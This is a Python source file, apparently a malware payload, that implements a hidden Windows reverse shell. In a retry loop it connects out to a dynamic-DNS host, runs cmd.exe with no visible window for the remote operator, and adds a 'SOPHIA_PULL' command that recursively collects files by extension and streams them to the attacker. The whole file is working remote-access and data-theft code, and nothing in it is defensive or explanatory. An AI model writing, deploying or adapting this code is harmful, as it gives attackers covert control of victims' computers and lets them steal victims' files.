# payload.py
# The Heartbeat Soul. Now with the Sophia Protocol for data transcendence.

import os
import sys
import time
import random
import socket
import subprocess
from threading import Thread
import hashlib # Sophia's Checksum Tool
import itertools 
import base64

# --- DYNAMIC CONFIG ---
RHOST = "pong-control.ddns.net"
RPORT = ##RPORT##
# ----------------------

def find_files(start_dir, extensions_str):
    """Recursively finds files with specified extensions for the Sophia Protocol."""
    files_to_transfer = []
    # Normalize extensions (e.g., .jpg, .JPG -> jpg, JPG)
    extensions = {ext.strip().lower() for ext in extensions_str.split(',') if ext.strip()}
    
    if not os.path.isdir(start_dir):
        return files_to_transfer # Empty list if path is invalid

    for root, _, files in os.walk(start_dir):
        for file in files:
            # Handle files without extensions gracefully
            if '.' in file:
                file_ext = file.split('.')[-1].lower()
                if file_ext in extensions:
                    files_to_transfer.append(os.path.join(root, file))
    return files_to_transfer

def handle_sophia_pull(s_obj, command_line):
    """Handles the SOPHIA_PULL command and transfers files reliably."""
    parts = command_line.split(' ', 2)
    if len(parts) != 3:
        s_obj.sendall(b"\n[SOPHIA ERROR] Usage: SOPHIA_PULL <directory> <ext1,ext2,...>\n")
        return

    start_dir = parts[1].strip()
    extensions_str = parts[2].strip()
    
    # Send a status message back to the attacker immediately
    s_obj.sendall(f"\n[SOPHIA STATUS] Searching for files with extensions '{extensions_str}' in '{start_dir}'...\n".encode('utf-8'))
    
    files = find_files(start_dir, extensions_str)
    
    if not files:
        s_obj.sendall(b"\n[SOPHIA STATUS] No files found matching criteria. Aborting transfer.\n")
        return

    s_obj.sendall(f"\n[SOPHIA START] Total files to transfer: {len(files)}\n".encode('utf-8'))

    # Reliable block-by-block transfer for each file
    for filepath in files:
        try:
            file_size = os.path.getsize(filepath)
            
            # 1. Calculate SHA256 Checksum (reading in chunks for large file support)
            sha256_hash = hashlib.sha256()
            with open(filepath, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    sha256_hash.update(chunk)
            file_hash = sha256_hash.hexdigest()

            # 2. Send File Metadata (path, size, hash) to the nc listener for parsing
            # We use base64 for the path to ensure any weird characters don't break the protocol
            b64_filepath = base64.b64encode(filepath.encode('utf-8')).decode('utf-8')
            metadata = f"[FILE_START] {b64_filepath}|{file_size}|{file_hash}\n"
            s_obj.sendall(metadata.encode('utf-8'))
            s_obj.sendall(f"[SOPHIA STATUS] Transferring: {filepath} ({file_size} bytes)\n".encode('utf-8'))

            # 3. Send Binary Content
            with open(filepath, 'rb') as f:
                f.seek(0) # Rewind the file pointer after hashing
                while True:
                    chunk = f.read(4096) # Block sending
                    if not chunk:
                        break
                    s_obj.sendall(chunk)
            
            # 4. Send File End Marker
            s_obj.sendall(f"\n[FILE_END] {b64_filepath}\n".encode('utf-8'))
            
        except Exception as e:
            s_obj.sendall(f"\n[SOPHIA ERROR] Failed to transfer {filepath}: {str(e)}\n".encode('utf-8'))
            continue # Move to the next file

    s_obj.sendall(b"\n[SOPHIA END] All specified file transfers complete.\n")

def run_conduit():
    """
    The main reverse shell loop. This is the soul's eternal work.
    """
    while True:
        try:
            # The Heartbeat: The soul attempts to connect.
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            # Once connected, the ritual begins.
            CREATE_NO_WINDOW = 0x08000000
            # We ensure the CMD process persists and maintains state (path changes)
            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
            
            # --- MODIFIED INPUT THREAD: Command Interception ---
            def p_in():
                buffer = b''
                while True:
                    try:
                        chunk = s_obj.recv(4096) # Use a larger chunk for input
                        if not chunk: break
                        
                        buffer += chunk

                        # Process commands line by line
                        if b'\n' in buffer:
                            lines = buffer.splitlines(True) 
                            buffer = b'' 

                            for line in lines:
                                if line.endswith(b'\n') or line.endswith(b'\r\n'):
                                    command_line = line.decode('utf-8').strip()
                                    
                                    # Check for special SOPHIA command
                                    if command_line.upper().startswith('SOPHIA_PULL'):
                                        handle_sophia_pull(s_obj, command_line)
                                    else:
                                        # Not a special command, pass it to the CMD process
                                        p.stdin.write(line);p.stdin.flush()
                                else:
                                    # Partial line goes back into the buffer
                                    buffer = line 
                        elif buffer and len(buffer) > 4096 * 10: 
                             # Safety: pass large un-delimited block to cmd
                             p.stdin.write(buffer);p.stdin.flush()
                             buffer = b''

                    except Exception: break
                s_obj.close()
            # --- END MODIFIED INPUT THREAD ---
            
            # --- OPTIMIZED OUTPUT/ERROR THREADS (Faster I/O) ---
            def p_out():
                while True:
                    try:
                        # Read large blocks from the stdout stream
                        d=os.read(p.stdout.fileno(), 4096);
                        if not d: break;
                        s_obj.sendall(d)
                    except: break
                s_obj.close()
            def p_err():
                while True:
                    try:
                        # Read large blocks from the stderr stream
                        d=os.read(p.stderr.fileno(), 4096);
                        if not d: break;
                        s_obj.sendall(d)
                    except: break
                s_obj.close()
            # --- END OPTIMIZED THREADS ---

            Thread(target=p_in, daemon=True).start()
            Thread(target=p_out, daemon=True).start()
            Thread(target=p_err, daemon=True).start()
            p.wait() # This will block until the connection is broken by the master.

        except Exception:
            # If the connection fails or is broken by the master, the heart rests, then beats again.
            time.sleep(random.randint(30, 60))
            continue # Go back to the start of the 'while True' loop and try again.

if __name__ == "__main__":
    run_conduit()